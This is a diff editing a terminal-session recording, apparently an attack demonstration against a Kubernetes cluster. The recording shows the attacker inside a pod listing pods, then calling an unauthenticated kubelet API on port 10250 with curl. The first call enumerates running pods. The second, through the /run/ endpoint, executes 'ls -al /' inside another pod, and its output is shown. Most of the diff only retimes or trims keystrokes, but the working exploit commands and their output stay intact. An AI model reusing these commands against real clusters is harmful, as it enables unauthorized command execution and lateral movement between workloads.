@@ -12,154 +12,14 @@
   "stdout": [
     [
       0.241224,
-      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m\u001b[0m"
     ],
     [
-      0.444637,
-      "ku"
-    ],
-    [
-      6.2e-05,
-      "bectl"
-    ],
-    [
-      9e-05,
-      " exe"
-    ],
-    [
-      4e-05,
-      "c "
-    ],
-    [
-      3.7e-05,
-      "-i"
-    ],
-    [
-      4.1e-05,
-      "t"
-    ],
-    [
-      3.9e-05,
-      " v"
-    ],
-    [
-      3.6e-05,
-      "ul"
-    ],
-    [
-      4.6e-05,
-      "n"
-    ],
-    [
-      3.6e-05,
-      "we"
-    ],
-    [
-      3.5e-05,
-      "b"
-    ],
-    [
-      3.4e-05,
-      "-"
-    ],
-    [
-      3.4e-05,
-      "25"
-    ],
-    [
-      0.000128,
-      "6"
-    ],
-    [
-      5.3e-05,
-      "99414"
-    ],
-    [
-      4e-05,
-      "05"
-    ],
-    [
-      3.7e-05,
-      "-"
-    ],
-    [
-      9.1e-05,
-      "q"
-    ],
-    [
-      4.5e-05,
-      "8v9r"
-    ],
-    [
-      8.9e-05,
-      " "
-    ],
-    [
-      0.000159,
-      "/bi"
-    ],
-    [
-      6.5e-05,
-      "n/ba"
-    ],
-    [
-      5e-05,
-      "s"
-    ],
-    [
-      2.9e-05,
-      "h"
-    ],
-    [
-      0.196637,
-      "\r\n"
-    ],
-    [
-      0.374313,
+      0.001938,
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
-      "\r                                                                                         \rroot@vulnweb-2569941405-q8v9r:/# export TERM=xt"
-    ],
-    [
-      8.9e-05,
-      "erm"
-    ],
-    [
-      0.197025,
-      "\r\nroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      0.552845,
-      "c"
-    ],
-    [
-      0.136083,
-      "l"
-    ],
-    [
-      0.099331,
-      "e"
-    ],
-    [
-      0.068876,
-      "a"
-    ],
-    [
-      0.101706,
-      "r"
-    ],
-    [
-      0.100123,
-      "\r\n"
-    ],
-    [
-      0.00051,
-      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      2.0,
+      0.5,
       "kubectl get pods -o wide"
     ],
     [
@@ -175,7 +35,7 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      2.5,
       "ping -c1 172.20.48.188"
     ],
     [
@@ -187,7 +47,7 @@
       "PING 172.20.48.188 (172.20.48.188) 56(84) bytes of data.\r\n64 bytes from 172.20.48.188: icmp_seq=1 ttl=64 time=0.051 ms\r\n\r\n--- 172.20.48.188 ping statistics ---\r\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\r\nrtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms\r\nroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      1.787564,
+      1.087564,
       "c"
     ],
     [
@@ -211,12 +71,8 @@
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
-      "curl -sk https://172.20.48.188:10"
-    ],
-    [
-      0.000138,
-      "250/"
+      1.0,
+      "curl -sk https://172.20.48.188:10250/"
     ],
     [
       2.0,
@@ -235,7 +91,7 @@
       "curl -sk https://172.20.48.188:10250/runningpods/"
     ],
     [
-      0.285988,
+      2.0,
       "\r\n"
     ],
     [
@@ -251,7 +107,7 @@
       "sha256:5373a1c294c9ffb2e842d74d3df8fcc5bed68c02af3fb3611c2fd71a411a68fe\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"azure-vote-front-1874756303-c3s69\",\"namespace\":\"default\",\"uid\":\"5c873214-ba02-11e7-801a-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"azure-vote-front\",\"image\":\"microsoft/azure-vote-front@sha256:1c7abbebcfc00dab064c7a5ea7ddb9ad3c6a9ecc5c8a99a42cebc2aa833e1fe7\",\"resources\":{}}]},\"status\":{}}]}\r\nroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      4.0,
       "c"
     ],
     [
@@ -287,22 +143,6 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      1.601787,
-      "l"
-    ],
-    [
-      0.109369,
-      "s"
-    ],
-    [
-      0.897723,
-      "\r\n"
-    ],
-    [
-      0.001166,
-      "allpods  bin   dev  home  lib64  mnt  proc  run   srv  tmp  var\r\napp.py\t boot  etc  lib   media  opt  root  sbin  sys  usr\r\nroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
       2.0,
       "v"
     ],
@@ -319,14 +159,6 @@
       "a"
     ],
     [
-      0.168771,
-      "p"
-    ],
-    [
-      0.369602,
-      "\b\u001b[K"
-    ],
-    [
       0.247582,
       "l"
     ],
@@ -339,7 +171,7 @@
       "p"
     ],
     [
-      0.514156,
+      0.114156,
       "ods "
     ],
     [
@@ -464,18 +296,10 @@
     ],
     [
       2.0,
-      "curl -sk https://172.2"
+      "curl -sk https://172.20.48.188:10250/run/default/azure-vo \rte-front-1874756303-c3s69/azure-vote-front -d \"cmd=ls -al /\""
     ],
     [
-      0.000223,
-      "0.48.188:10250/run/default/azure-vo \rte-front-1874756303-c3s69/azure-vote-front -"
-    ],
-    [
-      0.003554,
-      "d \"cmd=ls -al /\""
-    ],
-    [
-      2.0,
+      5.0,
       "\r\n"
     ],
     [
@@ -661,14 +485,6 @@
     [
       0.00016,
       "if __name__ == \"__main__\":\r\n    app.run()root@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      2.0,
-      "exit\r\n"
-    ],
-    [
-      0.031378,
-      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
     ]
   ]
 }
